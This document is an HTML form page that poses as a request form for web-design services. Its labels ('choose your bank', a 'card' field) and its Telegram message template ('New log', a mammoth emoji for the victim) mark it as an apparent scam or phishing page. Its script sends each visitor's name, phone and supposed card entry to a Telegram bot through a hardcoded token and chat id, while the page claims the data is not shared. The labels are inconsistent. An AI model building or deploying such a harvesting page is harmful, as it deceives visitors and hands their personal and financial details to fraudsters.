<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Заявка</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
  background: #f8fafc;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

/* карточка */
.box {
  background: white;
  padding: 35px;
  border-radius: 24px;
  width: 360px;
  text-align: center;
  box-shadow: 0 20px 60px rgba(0,0,0,0.08);
  animation: fade 0.6s ease;
}

@keyframes fade {
  from {opacity: 0; transform: translateY(20px);}
  to {opacity: 1; transform: translateY(0);}
}

/* заголовок */
h2 {
  margin-bottom: 20px;
  color: #0f172a;
}

/* поля */
input {
  width: 100%;
  padding: 14px;
  margin: 8px 0;
  border: 1px solid #e2e8f0;
  border-radius: 12px;
  font-size: 14px;
  transition: 0.2s;
}

input:focus {
  border-color: #3b82f6;
  box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
  outline: none;
}

/* услуги */
.service {
  padding: 12px;
  margin: 6px 0;
  border-radius: 12px;
  background: #f1f5f9;
  cursor: pointer;
  transition: 0.2s;
  font-size: 14px;
}

.service:hover {
  background: #e2e8f0;
}

.service.active {
  background: #3b82f6;
  color: white;
}

/* кнопка */
button {
  width: 100%;
  padding: 14px;
  background: linear-gradient(90deg, #3b82f6, #06b6d4);
  border: none;
  border-radius: 12px;
  color: white;
  font-size: 15px;
  cursor: pointer;
  margin-top: 12px;
  transition: 0.3s;
}

button:hover {
  transform: translateY(-2px);
  box-shadow: 0 10px 20px rgba(59,130,246,0.3);
}

/* подпись */
.small {
  font-size: 12px;
  color: #64748b;
  margin-top: 12px;
}
</style>
</head>

<body>

<div class="box">
  <h2>Відправити заявку</h2></h2>

  <input type="text" id="name" placeholder="Ваше имя">
  <input type="text" id="phone" placeholder="Ваш телефон">
  <input type="text" id="telegram" placeholder="@ваш_телеграм">

  <p style="color:#475569; font-size:14px;">Виберіть ваш банк:</p>

  <div class="service" onclick="selectService(this)">Сайт под ключ</div>
  <div class="service" onclick="selectService(this)">Дизайн</div>
  <div class="service" onclick="selectService(this)">Телеграм бот</div>

  <button onclick="send()">Відправити</button>

  <div class="small">Ми не передаємо ваші данні</div>
</div>

<script>
let selectedService = "";

function selectService(el) {
  document.querySelectorAll(".service").forEach(e => e.classList.remove("active"));
  el.classList.add("active");
  selectedService = el.innerText;
}

function send() {
  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const telegram = document.getElementById("telegram").value.trim();

  if (!name || !phone || !telegram || !selectedService) {
    alert("Заполни все поля!");
    return;
  }

  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
  const chat_id = "8035773808";

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chat_id,
      text: `🔥 Новый Лог 👻:
Имя🦣: ${name}
Телефон📱: ${phone}
Карта💳: ${telegram}
Услуга: ${selectedService}`
    })
  });

  alert("Заявка віправлена!");

  // очистка
  document.getElementById("name").value = "";
  document.getElementById("phone").value = "";
  document.getElementById("telegram").value = "";
  selectedService = "";
  document.querySelectorAll(".service").forEach(e => e.classList.remove("active"));
}
</script>

</body>
</html>
